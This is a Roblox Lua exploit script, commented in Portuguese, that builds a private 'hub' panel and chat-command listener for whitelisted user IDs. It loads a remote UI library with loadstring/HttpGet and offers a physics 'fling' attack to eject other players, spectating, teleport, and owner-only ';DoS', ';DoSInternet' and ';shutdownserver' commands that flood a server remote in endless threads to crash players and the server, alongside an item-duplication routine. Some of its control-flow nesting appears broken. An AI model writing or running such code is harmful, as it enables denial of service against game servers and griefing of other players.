-- Carrega a Library do Rayfield
local Rayfield = loadstring(game:HttpGet("https://raw.githubusercontent.com/SiriusSoftwareLtd/Rayfield/refs/heads/main/source.lua"))()

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local StarterGui = game:GetService("StarterGui")
local Workspace = game:GetService("Workspace")
local SoundService = game:GetService("SoundService")
local LocalPlayer = Players.LocalPlayer

-- VARIÁVEIS DE CONTROLE
local flingActive = false
local uncoverActive = false
local originalCamSubject = nil

-- CONFIGURAÇÃO DOS IDS
local ID_DONO = 9008578450  -- COLOQUE O SEU ID AQUI
local ID_AMIGO = 87654321 -- COLOQUE O ID DO SEU AMIGO AQUI

-- Tabela de permissão geral para abrir o Hub
local IDsAutorizados = {
    [ID_DONO] = true,
    [ID_AMIGO] = true
}

-- Segurança: Se quem executou não estiver na lista, o script fecha imediatamente
if not IDsAutorizados[LocalPlayer.UserId] then
    return
end

-- Janela Principal do Hub
local Window = Rayfield:CreateWindow({
   Name = "MagN Hub Panel",
   LoadingTitle = "Autenticando Usuário...",
   LoadingSubtitle = "Uso Restrito",
   ConfigurationSaving = { Enabled = false },
   KeySystem = false
})

local MainTab = Window:CreateTab("Comandos", 4483362458)

-- ==========================================
-- ABA 1: MODERAÇÃO LEVE (Acessível por Você e pelo Amigo)
-- ==========================================
local SectionLeve = MainTab:CreateSection("Moderação Leve")
local AlvoSelecionado = ""

MainTab:CreateInput({
   Name = "Nome do Alvo",
   PlaceholderText = "Digite o nome...",
   RemoveTextAfterFocusLost = false,
   Callback = function(Text)
       AlvoSelecionado = Text
   end,
})

MainTab:CreateButton({
   Name = ";fling",
   Callback = function()
       if AlvoSelecionado ~= "" then
            local target = nil
            for _, p in pairs(Players:GetPlayers()) do
                if string.lower(p.Name):match("^" .. string.lower(AlvoSelecionado)) or 
                   (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(AlvoSelecionado))) then
                    target = p
                    break
                end
            end

            if target and target ~= LocalPlayer then
                Rayfield:Notify({Title = "Ataque Iniciado", Content = "Executando fling em: " .. target.Name, Duration = 3, Image = "swords"})
                
                flingActive = false
                task.wait(0.05)
                flingActive = true

                task.spawn(function()
                    local char = LocalPlayer.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    local hum = char and char:FindFirstChildOfClass("Humanoid")
                    local originalCFrame = root and root.CFrame
                    local backpack = LocalPlayer:WaitForChild("Backpack")
                    local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

                    if not backpack:FindFirstChild("SoccerBall") then
                        game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
                    end
                    repeat task.wait() until backpack:FindFirstChild("SoccerBall")
                    backpack.SoccerBall.Parent = char
                    repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name)
                    char.SoccerBall.Parent = backpack
                    local Ball = ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name)

                    Ball.CanCollide = false
                    Ball.Massless = true
                    Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

                    if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character:FindFirstChildOfClass("Humanoid") and target.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
                        local tchar = target.Character
                        local thum = tchar:FindFirstChildOfClass("Humanoid")

                        for _, child in pairs(Ball:GetChildren()) do
                            if child:IsA("BodyVelocity") or child:IsA("BodyAngularVelocity") then
                                child:Destroy()
                            end
                        end

                        local bv = Instance.new("BodyVelocity")
                        bv.Name = "FlingPower"
                        bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
                        bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                        bv.P = 9e900
                        bv.Parent = Ball

                        local bav = Instance.new("BodyAngularVelocity")
                        bav.Name = "FlingSpin"
                        bav.AngularVelocity = Vector3.new(9e8, 9e8, 9e8)
                        bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                        bav.P = 9e900
                        bav.Parent = Ball

                        workspace.CurrentCamera.CameraSubject = thum
                        
                        while flingActive and thum.Health > 0 and tchar:IsDescendantOf(workspace) and target.Parent == Players do
                            for _, v in pairs(tchar:GetDescendants()) do
                                if not flingActive or thum.Health <= 0 then break end
                                if v:IsA("BasePart") and not v.Anchored and v.Name ~= "HumanoidRootPart" then
                                    Ball.CFrame = v.CFrame
                                    Ball.Velocity = Vector3.new(9e8, 9e8, 9e8)
                                    Ball.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                                    task.wait(1/2000)
                                end
                            end
                            task.wait()
                        end
                        
                        if bv then bv:Destroy() end
                        if bav then bav:Destroy() end
                        Ball.Velocity = Vector3.zero
                        Ball.RotVelocity = Vector3.zero
                        
                        if root and originalCFrame then root.CFrame = originalCFrame end
                        workspace.CurrentCamera.CameraSubject = hum
                    else
                        if root and originalCFrame then root.CFrame = originalCFrame end
                    end
                    flingActive = false
                end)
            end
       end
   end,
})

MainTab:CreateButton({
   Name = ";view",
   Callback = function()
       if AlvoSelecionado ~= "" then
            local target = nil
            for _, p in pairs(Players:GetPlayers()) do
                if string.lower(p.Name):match("^" .. string.lower(AlvoSelecionado)) or 
                   (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(AlvoSelecionado))) then
                    target = p
                    break
                end
            end
            if target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") then
                workspace.CurrentCamera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
                Rayfield:Notify({Title = "Spectate", Content = "Espionando: " .. target.Name, Duration = 3})
            end
       end
   end,
})

MainTab:CreateButton({
   Name = ";unview",
   Callback = function()
       local char = LocalPlayer.Character
       local hum = char and char:FindFirstChildOfClass("Humanoid")
       if hum then
           workspace.CurrentCamera.CameraSubject = hum
           Rayfield:Notify({Title = "Spectate", Content = "Câmera restaurada para você.", Duration = 3})
       end
   end,
})

-- Comando Global de Limpeza Visual e de Áudio
MainTab:CreateButton({
   Name = ";uncover",
   Callback = function()
       uncoverActive = not uncoverActive
       if uncoverActive then
           Rayfield:Notify({Title = "Uncover Ativado", Content = "Ocultando roupas inadequadas e mutando áudios...", Duration = 4})
           
           -- Loop para limpar os personagens atuais e futuros, além de áudios persistentes
           task.spawn(function()
               while uncoverActive do
                   -- 1. Limpa componentes de vestuário visual abusivo de OUTROS jogadores
                   for _, p in pairs(Players:GetPlayers()) do
                       if p ~= LocalPlayer and p.Character then
                           for _, obj in pairs(p.Character:GetDescendants()) do
                               if obj:IsA("ShirtGraphic") or obj:IsA("Pants") or obj:IsA("Shirt") or obj:IsA("CharacterMesh") then
                                   obj:Destroy()
                               elseif obj:IsA("Decal") and (obj.Parent:IsA("Accessory") or obj.Parent.Name == "Head") then
                                   obj:Destroy()
                               end
                           end
                       end
                   end
                   
                   -- 2. Limpa e silencia áudios nocivos/exploitados no mapa e SoundService
                   for _, sound in pairs(Workspace:GetDescendants()) do
                       if sound:IsA("Sound") and sound.Playing then
                           sound.Volume = 0
                           sound:Stop()
                       end
                   end
                   for _, sound in pairs(SoundService:GetDescendants()) do
                       if sound:IsA("Sound") and sound.Playing then
                           sound.Volume = 0
                           sound:Stop()
                       end
                   end
                   
                   task.wait(1)
               end
           end)
       else
           Rayfield:Notify({Title = "Uncover Desativado", Content = "Modo de limpeza parado.", Duration = 4})
       end
   end,
})

MainTab:CreateButton({
   Name = ";tp",
   Callback = function()
       if AlvoSelecionado ~= "" then
            local target = nil
            for _, p in pairs(Players:GetPlayers()) do
                if string.lower(p.Name):match("^" .. string.lower(AlvoSelecionado)) or 
                   (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(AlvoSelecionado))) then
                    target = p
                    break
                end
            end

            if target and target ~= LocalPlayer then
                local char = LocalPlayer.Character
                local root = char and char:FindFirstChild("HumanoidRootPart")
                local tchar = target.Character
                local troot = tchar and tchar:FindFirstChild("HumanoidRootPart")

                if root and troot then
                    root.CFrame = troot.CFrame * CFrame.new(0, 2, 0)
                    Rayfield:Notify({
                        Title = "Teletransporte",
                        Content = "Teleportado para: " .. target.Name,
                        Duration = 3
                    })
                end
            end
       end
   end,
})

-- ==========================================
-- ABA 2: PAINEL ULTRA PRIVADO (Apenas se o ID for o do Dono)
-- ==========================================
if LocalPlayer.UserId == ID_DONO then
    local SectionPainel = MainTab:CreateSection("Moderação Pesada")

    MainTab:CreateButton({
       Name = ";DoS",
       Callback = function()
            local player = game:GetService("Players").LocalPlayer
            if not player then return end
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local starterGui = game:GetService("StarterGui")

            local character = player.Character or player.CharacterAdded:Wait()
            local rootpart = character:WaitForChild("HumanoidRootPart", 10)
            if not rootpart then 
                pcall(function() starterGui:SetCore("SendNotification", { Title = "Erro", Text = "HumanoidRootPart não encontrado.", Button1 = "Ok", Duration = 5 }) end)
                return 
            end
            local oldcf = rootpart.CFrame

            local re = replicatedStorage:FindFirstChild("RE")
            local toolRemote = re and re:FindFirstChild("1Too1l")

            if not toolRemote then 
                pcall(function() starterGui:SetCore("SendNotification", { Title = "Erro", Text = "Remote funcional não encontrado.", Button1 = "Ok", Duration = 5 }) end)
                return 
            end

            pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)

            task.spawn(function()
                for m = 1, 999999 do
                    task.spawn(function()
                        if toolRemote:IsA("RemoteFunction") then
                            toolRemote:InvokeServer("PickingTools", "FireHose")
                        else
                            toolRemote:FireServer("PickingTools", "FireHose")
                        end
                    end)

                    local backpack = player:FindFirstChild("Backpack")
                    if backpack then
                        local fireHose = backpack:FindFirstChild("FireHose")
                        if fireHose and fireHose:FindFirstChild("ToolSound") then
                            fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                        end
                    end
                    if m % 15 == 0 then task.wait(0.1) end
                end
            end)

            task.wait(0.4)
            player.CharacterRemoving:Wait()
            local newCharacter = player.CharacterAdded:Wait()
            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
            local humanoid = newCharacter:WaitForChild("Humanoid", 15)

            if newRootPart and humanoid then
                task.wait(0.7)
                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                newRootPart.CFrame = oldcf
                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end

            pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Concluído, Equipando Itens...", Button1 = "Ok", Duration = 5 }) end)
            task.wait(0.5)

            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                local items = backpack:GetChildren()
                local equipCount = 0
                for i = 1, #items do
                    local item = items[i]
                    if item:IsA("Tool") and item.Name == "FireHose" then
                        equipCount = equipCount + 1
                        task.defer(function() item.Parent = newCharacter end)
                        if equipCount % 8 == 0 then task.wait(0.02) end 
                    end
                end
            end
            task.wait(0.5)
            pcall(function() starterGui:SetCore("SendNotification", { Title = "Script de Dupe", Text = "Finalizando processo...", Button1 = "Ok", Duration = 5 }) end)
       end,
    })

    MainTab:CreateButton({
       Name = ";DoSInternet",
       Callback = function()
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
            local backpack = LocalPlayer:WaitForChild("Backpack") 
            local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
            local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
            
            if toolRemote and toolRemote:IsA("RemoteFunction") then 
                local args1 = { "PickingTools" , "FireHose" } 
                local args2 = { "FireHose" , "DestroyFireHose" } 
                
                for i = 1, 30 do 
                    task.spawn(function() 
                        for m = 1, 289 do 
                            pcall(function() toolRemote:InvokeServer(unpack(args1)) end) 
                            if m % 40 == 0 then task.wait() end 
                        end 
                        
                        task.spawn(function() 
                            local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
                            if fireHose then 
                                local toolSound = fireHose:FindFirstChild("ToolSound") 
                                if toolSound then pcall(function() toolSound:FireServer(unpack(args2)) end) end 
                            end 
                        end) 
                    end) 
                    task.wait(0.05) 
                end 
            end 
       end,
    })

    MainTab:CreateButton({
   Name = ";shutdownserver",
   Callback = function()
       pcall(function() 
           Rayfield:Notify({Title = "Moderação Pesada", Content = "Iniciando Shutdown Remoto do Servidor...", Duration = 5, Image = "alert"})
       end)
       
       task.spawn(function()
           local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
           local backpack = LocalPlayer:WaitForChild("Backpack")
           local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE")
           local toolRemote = remoteStorage:FindFirstChild("1Too1l")
           
           if toolRemote and toolRemote:IsA("RemoteFunction") then
               local args1 = { "PickingTools", "FireHose" }
               local args2 = { "FireHose", "DestroyFireHose" }
               
               -- 30 threads paralelas de processamento contínuo
               for i = 1, 30 do 
                   task.spawn(function()
                       -- loop infinito controlado para não travar o executor local, mas estressar a rede externa
                       while true do 
                           -- Cria micro-threads externas para disparar sem reter a memória do seu client
                           task.defer(function()
                               pcall(function()
                                   toolRemote:InvokeServer(unpack(args1))
                               end)
                           end)
                           
                           task.defer(function()
                               local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose")
                               if fireHose then
                                   local toolSound = fireHose:FindFirstChild("ToolSound")
                                   if toolSound then
                                       pcall(function()
                                           toolSound:FireServer(unpack(args2))
                                       end)
                                   end
                               end
                           end)
                           
                           -- Micro-espera vital para permitir que a sua placa de rede envie os pacotes ao servidor antes do seu client fechar por falta de memória
                           task.wait(1/60) 
                       end
                   end)
               end
           end
       end)
   end,
})
end

-- ==========================================
-- SISTEMA DE ESCUTA DE CHAT COM VALIDAÇÃO DE CARGO
-- ==========================================
local function OuvirChat(Jogador, Mensagem)
    -- 1. Comandos públicos para os 2 usuários da Whitelist
    if IDsAutorizados[Jogador.UserId] then
        -- COMANDO ;fling
        if string.sub(Mensagem, 1, 7) == ";fling " then
            local NomeDoAlvo = string.sub(Mensagem, 8)
            if NomeDoAlvo and NomeDoAlvo ~= "" then
                local target = nil
                for _, p in pairs(Players:GetPlayers()) do
                    if string.lower(p.Name):match("^" .. string.lower(NomeDoAlvo)) or 
                       (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(NomeDoAlvo))) then
                        target = p
                        break
                    end
                end

                if target and target ~= LocalPlayer then
                    Rayfield:Notify({Title = "Ataque Iniciado", Content = "Executando fling em: " .. target.Name, Duration = 3, Image = "swords"})
                    
                    flingActive = false
                    task.wait(0.05)
                    flingActive = true

                    task.spawn(function()
                        local char = LocalPlayer.Character
                        local root = char and char:FindFirstChild("HumanoidRootPart")
                        local hum = char and char:FindFirstChildOfClass("Humanoid")
                        local originalCFrame = root and root.CFrame
                        local backpack = LocalPlayer:WaitForChild("Backpack")
                        local ServerBalls = workspace.WorkspaceCom:WaitForChild("001_SoccerBalls")

                        if not backpack:FindFirstChild("SoccerBall") then
                            game:GetService("ReplicatedStorage").RE:FindFirstChild("1Too1l"):InvokeServer("PickingTools", "SoccerBall")
                        end
                        repeat task.wait() until backpack:FindFirstChild("SoccerBall")
                        backpack.SoccerBall.Parent = char
                        repeat task.wait() until ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name)
                        char.SoccerBall.Parent = backpack
                        local Ball = ServerBalls:FindFirstChild("Soccer" .. LocalPlayer.Name)

                        Ball.CanCollide = false
                        Ball.Massless = true
                        Ball.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0, 0)

                        if target.Character and target.Character:FindFirstChild("HumanoidRootPart") and target.Character:FindFirstChildOfClass("Humanoid") and target.Character:FindFirstChildOfClass("Humanoid").Health > 0 then
                            local tchar = target.Character
                            local thum = tchar:FindFirstChildOfClass("Humanoid")

                            for _, child in pairs(Ball:GetChildren()) do
                                if child:IsA("BodyVelocity") or child:IsA("BodyAngularVelocity") then child:Destroy() end
                            end

                            local bv = Instance.new("BodyVelocity")
                            bv.Name = "FlingPower"
                            bv.Velocity = Vector3.new(9e8, 9e8, 9e8)
                            bv.MaxForce = Vector3.new(math.huge, math.huge, math.huge)
                            bv.P = 9e900
                            bv.Parent = Ball

                            local bav = Instance.new("BodyAngularVelocity")
                            bav.Name = "FlingSpin"
                            bav.AngularVelocity = Vector3.new(9e8, 9e8, 9e8)
                            bav.MaxTorque = Vector3.new(math.huge, math.huge, math.huge)
                            bav.P = 9e900
                            bav.Parent = Ball

                            workspace.CurrentCamera.CameraSubject = thum
                            
                            while flingActive and thum.Health > 0 and tchar:IsDescendantOf(workspace) and target.Parent == Players do
                                for _, v in pairs(tchar:GetDescendants()) do
                                    if not flingActive or thum.Health <= 0 then break end
                                    if v:IsA("BasePart") and not v.Anchored and v.Name ~= "HumanoidRootPart" then
                                        Ball.CFrame = v.CFrame
                                        Ball.Velocity = Vector3.new(9e8, 9e8, 9e8)
                                        Ball.RotVelocity = Vector3.new(9e8, 9e8, 9e8)
                                        task.wait(1/2000)
                                    end
                                end
                                task.wait()
                            end
                            
                            if bv then bv:Destroy() end
                            if bav then bav:Destroy() end
                            Ball.Velocity = Vector3.zero
                            Ball.RotVelocity = Vector3.zero
                            
                            if root and originalCFrame then root.CFrame = originalCFrame end
                            workspace.CurrentCamera.CameraSubject = hum
                        else
                            if root and originalCFrame then root.CFrame = originalCFrame end
                        end
                        flingActive = false
                    end)
                end
            end

                    if string.sub(Mensagem, 1, 4) == ";tp " then
            local NomeDoAlvo = string.sub(Mensagem, 5)
            if NomeDoAlvo and NomeDoAlvo ~= "" then
                local target = nil
                for _, p in pairs(Players:GetPlayers()) do
                    if string.lower(p.Name):match("^" .. string.lower(NomeDoAlvo)) or 
                       (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(NomeDoAlvo))) then
                        target = p
                        break
                    end
                end

                if target and target ~= LocalPlayer then
                    local char = LocalPlayer.Character
                    local root = char and char:FindFirstChild("HumanoidRootPart")
                    local tchar = target.Character
                    local troot = tchar and tchar:FindFirstChild("HumanoidRootPart")

                    if root and troot then
                        root.CFrame = troot.CFrame * CFrame.new(0, 2, 0)
                        Rayfield:Notify({
                            Title = "Teletransporte via Chat",
                            Content = "Teleportado para: " .. target.Name,
                            Duration = 3
                        })
                    end
                end
            end
            end
        -- COMANDO ;view
        elseif string.sub(Mensagem, 1, 6) == ";view " then
            local NomeDoAlvo = string.sub(Mensagem, 7)
            if NomeDoAlvo and NomeDoAlvo ~= "" then
                local target = nil
                for _, p in pairs(Players:GetPlayers()) do
                    if string.lower(p.Name):match("^" .. string.lower(NomeDoAlvo)) or 
                       (p.DisplayName and string.lower(p.DisplayName):match("^" .. string.lower(NomeDoAlvo))) then
                        target = p
                        break
                    end
                end
                if target and target.Character and target.Character:FindFirstChildOfClass("Humanoid") then
                    workspace.CurrentCamera.CameraSubject = target.Character:FindFirstChildOfClass("Humanoid")
                    Rayfield:Notify({Title = "Spectate", Content = "Espionando via chat: " .. target.Name, Duration = 3})
                end
            end
        -- COMANDO ;unview
        elseif Mensagem == ";unview" then
            local char = LocalPlayer.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum then
                workspace.CurrentCamera.CameraSubject = hum
                Rayfield:Notify({Title = "Spectate", Content = "Câmera restaurada para você.", Duration = 3})
            end
        -- COMANDO ;uncover
        elseif Mensagem == ";uncover" then
            uncoverActive = not uncoverActive
            if uncoverActive then
                Rayfield:Notify({Title = "Uncover Ativado", Content = "Limpando o servidor via chat...", Duration = 4})
                task.spawn(function()
                    while uncoverActive do
                        for _, p in pairs(Players:GetPlayers()) do
                            if p ~= LocalPlayer and p.Character then
                                for _, obj in pairs(p.Character:GetDescendants()) do
                                    if obj:IsA("ShirtGraphic") or obj:IsA("Pants") or obj:IsA("Shirt") or obj:IsA("CharacterMesh") then
                                        obj:Destroy()
                                    elseif obj:IsA("Decal") and (obj.Parent:IsA("Accessory") or obj.Parent.Name == "Head") then
                                        obj:Destroy()
                                    end
                                end
                            end
                        end
                        for _, sound in pairs(Workspace:GetDescendants()) do
                            if sound:IsA("Sound") and sound.Playing then
                                sound.Volume = 0
                                sound:Stop()
                            end
                        end
                        for _, sound in pairs(SoundService:GetDescendants()) do
                            if sound:IsA("Sound") and sound.Playing then
                                sound.Volume = 0
                                sound:Stop()
                            end
                        end
                        task.wait(1)
                    end
                end)
            else
                Rayfield:Notify({Title = "Uncover Desativado", Content = "Modo de limpeza parado.", Duration = 4})
            end
        end
    
    if Jogador == LocalPlayer then return end
    if IDsAutorizados[Jogador.UserId] then
        if Mensagem == ";DoS" then
            local player = game:GetService("Players").LocalPlayer
            if not player then return end
            local replicatedStorage = game:GetService("ReplicatedStorage")
            local starterGui = game:GetService("StarterGui")

            local character = player.Character or player.CharacterAdded:Wait()
            local rootpart = character:WaitForChild("HumanoidRootPart", 10)
            if not rootpart then return end
            local oldcf = rootpart.CFrame

            local re = replicatedStorage:FindFirstChild("RE")
            local toolRemote = re and re:FindFirstChild("1Too1l")
            if not toolRemote then return end

            pcall(function() starterGui:SetCore("SendNotification", { Title = "Ataque DoS Iniciado", Text = "Aguarde os jogadores Crashar", Button1 = "Ok", Duration = 5 }) end)

            task.spawn(function()
                for m = 1, 999999 do
                    task.spawn(function()
                        if toolRemote:IsA("RemoteFunction") then
                            toolRemote:InvokeServer("PickingTools", "FireHose")
                        else
                            toolRemote:FireServer("PickingTools", "FireHose")
                        end
                    end)

                    local backpack = player:FindFirstChild("Backpack")
                    if backpack then
                        local fireHose = backpack:FindFirstChild("FireHose")
                        if fireHose and fireHose:FindFirstChild("ToolSound") then
                            fireHose.ToolSound:FireServer("FireHose", "DestroyFireHose")
                        end
                    end
                    if m % 15 == 0 then task.wait(0.1) end
                end
            end)

            task.wait(0.4)
            player.CharacterRemoving:Wait()
            local newCharacter = player.CharacterAdded:Wait()
            local newRootPart = newCharacter:WaitForChild("HumanoidRootPart", 15)
            local humanoid = newCharacter:WaitForChild("Humanoid", 15)

            if newRootPart and humanoid then
                task.wait(0.7)
                humanoid:ChangeState(Enum.HumanoidStateType.Physics)
                newRootPart.CFrame = oldcf
                newRootPart.AssemblyLinearVelocity = Vector3.new(0, 0, 0)
            end

            local backpack = player:WaitForChild("Backpack", 10)
            if backpack then
                local items = backpack:GetChildren()
                local equipCount = 0
                for i = 1, #items do
                    local item = items[i]
                    if item:IsA("Tool") and item.Name == "FireHose" then
                        equipCount = equipCount + 1
                        task.defer(function() item.Parent = newCharacter end)
                        if equipCount % 8 == 0 then task.wait(0.02) end 
                    end
                end

            Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Normal) ativado com sucesso.", Duration = 4 })

        elseif Mensagem == ";DoSInternet" then
            local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait() 
            local backpack = LocalPlayer:WaitForChild("Backpack") 
            local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE") 
            local toolRemote = remoteStorage:FindFirstChild("1Too1l") 
            
            if toolRemote and toolRemote:IsA("RemoteFunction") then 
                local args1 = { "PickingTools" , "FireHose" } 
                local args2 = { "FireHose" , "DestroyFireHose" } 
                
                for i = 1, 30 do 
                    task.spawn(function() 
                        for m = 1, 289 do 
                            pcall(function() toolRemote:InvokeServer(unpack(args1)) end) 
                            if m % 40 == 0 then task.wait() end 
                        end 
                        task.spawn(function() 
                            local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose") 
                            if fireHose then 
                                local toolSound = fireHose:FindFirstChild("ToolSound") 
                                if toolSound then pcall(function() toolSound:FireServer(unpack(args2)) end) end 
                            end 
                        end) 
                    end) 
                    task.wait(0.05) 
                end 
            end

            Rayfield:Notify({ Title = "Painel Privado", Content = "Gatilho DoS (Internet) ativado com sucesso.", Duration = 4 })
        end

        if Mensagem == ";shutdownserver" then
            pcall(function() 
                Rayfield:Notify({Title = "Comando Executado", Content = "Gatilho de Shutdown ativado via Chat.", Duration = 4}) 
            end)

            task.spawn(function()
                local character = LocalPlayer.Character or LocalPlayer.CharacterAdded:Wait()
                local backpack = LocalPlayer:WaitForChild("Backpack")
                local remoteStorage = game:GetService("ReplicatedStorage"):WaitForChild("RE")
                local toolRemote = remoteStorage:FindFirstChild("1Too1l")
                
                if toolRemote and toolRemote:IsA("RemoteFunction") then
                    local args1 = { "PickingTools", "FireHose" }
                    local args2 = { "FireHose", "DestroyFireHose" }
                    
                    for i = 1, 30 do 
                        task.spawn(function()
                            while true do 
                                task.defer(function()
                                    pcall(function()
                                        toolRemote:InvokeServer(unpack(args1))
                                    end)
                                end)
                                
                                task.defer(function()
                                    local fireHose = backpack:FindFirstChild("FireHose") or character:FindFirstChild("FireHose")
                                    if fireHose then
                                        local toolSound = fireHose:FindFirstChild("ToolSound")
                                        if toolSound then
                                            pcall(function()
                                                toolSound:FireServer(unpack(args2))
                                            end)
                                        end
                                    end
                                end)
                                task.wait(1/60) 
                            end
                        end)
                    end
                end
            end)
        end
    end
end
end

-- Conecta os loops de eventos ao Chat do Roblox
for _, Player in ipairs(Players:GetPlayers()) do
    Player.Chatted:Connect(function(msg) OuvirChat(Player, msg) end)
end

Players.PlayerAdded:Connect(function(Player)
    Player.Chatted:Connect(function(msg) OuvirChat(Player, msg) end)
end)

